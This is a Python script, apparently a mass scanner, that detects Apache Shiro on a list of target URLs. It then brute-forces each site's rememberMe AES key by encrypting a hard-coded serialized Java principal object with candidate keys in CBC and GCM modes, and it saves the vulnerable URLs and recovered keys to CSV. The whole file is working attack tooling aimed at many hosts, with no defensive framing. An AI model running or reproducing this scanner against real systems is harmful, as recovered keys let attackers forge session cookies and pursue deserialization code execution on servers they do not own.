# -*- coding: UTF-8 -*-

import csv
import sys
import uuid
import asyncio
import aiohttp
import datetime
from tqdm import tqdm
import async_timeout
import base64
from Crypto.Cipher import AES


def aes(payload, key):
    BS = AES.block_size
    def pad(s): return s + ((BS - len(s) % BS)
                            * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(base64.b64decode(payload))
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext.decode('utf8')


def aes_v2(payload, key):
    BS = AES.block_size
    mode = AES.MODE_GCM
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = base64.b64decode(payload)
    enc, tag = encryptor.encrypt_and_digest(file_body)
    base64_ciphertext = base64.b64encode(iv + enc + tag)
    return base64_ciphertext.decode('utf8')


async def check_shiro(url, timeout=15):
    """
    check_shiro
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    async with aiohttp.ClientSession(cookies={"rememberMe": "123"}, trust_env=True) as session:
        try:
            async with async_timeout.timeout(timeout):
                async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as response:
                    _ = await response.text()
                    if 'Set-Cookie' not in response.headers.keys() or "rememberMe=deleteMe" not in response.headers['Set-Cookie']:
                        return url, 0
                    else:
                        return url, response.headers['Set-Cookie'].count("rememberMe=deleteMe")
        except Exception as e:
            return url, 0


async def check_key(url, count, keys_dict, timeout=20):
    """
    check_key
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    for key in keys_dict.keys():
        async with aiohttp.ClientSession(cookies={"rememberMe": keys_dict[key]}, trust_env=True) as session:
            try:
                async with async_timeout.timeout(timeout):
                    async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as response:
                        _ = await response.text()
                        if 'Set-Cookie' not in response.headers.keys() or response.headers['Set-Cookie'].count("rememberMe=deleteMe") == count - 1:
                            return url, key
            except Exception as e:
                return url, ''
    return url, ''

async def main(urls, keys_dict):
    """
    main
    """
    print(f'[{datetime.datetime.now()}] start check_shiro')
    tasks_1 = [asyncio.create_task(check_shiro(url)) for url in urls]
    shiro_urls = []

    with tqdm(total=len(tasks_1)) as pbar:
        for coro in asyncio.as_completed(tasks_1):
            result = await coro
            if result[1] > 0:
                shiro_urls.append(result)
            pbar.update(1)

    print(f'[{datetime.datetime.now()}] {len(shiro_urls)=}')
    print(f'[{datetime.datetime.now()}] start check_key')
    tasks_2 = []
    for url, count in shiro_urls:
        tasks_2.append(asyncio.create_task(check_key(url, count, keys_dict)))
    url_keys = []
    with tqdm(total=len(tasks_2)) as pbar:
        for coro in asyncio.as_completed(tasks_2):
            result = await coro
            if result[1] != '':
                url_keys.append(result)
            pbar.update(1)
    print(f'[{datetime.datetime.now()}] {len(url_keys)=}')
    return url_keys


def list2csv(path, rows, encoding='utf8'):
    ''''
    写入csv文件
    :param path: csv文件路径
    :param rows: 多行数据[[1,2],[...]]
    '''
    with open(path, 'a', newline='', encoding=encoding) as csvfile:
        csvwriter = csv.writer(csvfile, dialect='excel')
        csvwriter.writerows(rows)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.exit(f'Usage: {sys.argv[0]} urls.txt keys.txt')

    urls_file = sys.argv[1]
    keys_file = sys.argv[2]

    # urls_file = 'urls.txt'
    # keys_file = 'keys.txt'

    urls = [url.strip() for url in open(
        urls_file, 'r', encoding='utf8').readlines() if url.strip()]
    print(f'[{datetime.datetime.now()}] {len(urls)=}')
    keys = [key.strip() for key in open(
        keys_file, 'r', encoding='utf8').readlines() if key.strip()]
    print(f'[{datetime.datetime.now()}] {len(keys)=}')
    keys_dict = {}
    checker = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
    for key in keys:
        keys_dict[f'CBC_{key}'] = aes(checker, key)
        keys_dict[f'GCM_{key}'] = aes_v2(checker, key)
    print(f'[{datetime.datetime.now()}] {len(keys_dict.keys())=}')

    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(main(urls, keys_dict))
    print(f'[{datetime.datetime.now()}] end')
    list2csv(f'{urls_file}.csv', [['url', 'key']] + results, encoding='utf8')
    print(f'[{datetime.datetime.now()}] save to {urls_file}.csv')
